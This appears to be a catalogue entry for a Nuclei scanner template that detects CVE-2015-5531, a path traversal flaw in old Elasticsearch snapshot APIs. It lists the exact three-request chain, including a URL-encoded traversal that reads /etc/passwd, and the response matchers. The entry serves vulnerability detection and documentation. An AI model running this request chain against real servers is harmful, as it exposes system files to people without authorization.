---
cve_id: CVE-2015-5531
template_path: nuclei-templates/http/cves/2015/CVE-2015-5531.yaml
affected_product: Elasticsearch
severity: medium
authentication: none
external_callback: false
affected_versions: < 1.6.1
preconditions: []
poc_classification: info-leak
---

## Vulnerability
Elasticsearch versions before 1.6.1 suffer from a local file inclusion vulnerability in the snapshot API. Remote attackers can exploit path traversal to read arbitrary files on the server, leading to sensitive information disclosure.

## PoC / Detection
Classification: info-leak

The template detects the vulnerability through a three-request raw HTTP chain that sets up filesystem snapshot repositories and then triggers the path traversal:
- PUT to `/_snapshot/test` registering an fs repository at `/usr/share/elasticsearch/repo/test`
- PUT to `/_snapshot/test2` registering a nested repository at `/usr/share/elasticsearch/repo/test/snapshot-backdata`
- GET to `/_snapshot/test/backdata%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2fetc%2fpasswd` (URL-encoded traversal to `/etc/passwd`)

Matchers verify HTTP 400 status plus body containing `ElasticsearchParseException`, `Failed to derive xcontent from`, and byte sequence `114, 111, 111, 116, 58` (representing "root:" from the leaked passwd file).

## References
- https://github.com/vulhub/vulhub/tree/master/elasticsearch/CVE-2015-5531
- https://nvd.nist.gov/vuln/detail/CVE-2015-5531
- http://packetstormsecurity.com/files/132721/Elasticsearch-Directory-Traversal.html
- https://www.elastic.co/community/security/
- http://packetstormsecurity.com/files/133797/ElasticSearch-Path-Traversal-Arbitrary-File-Download.html
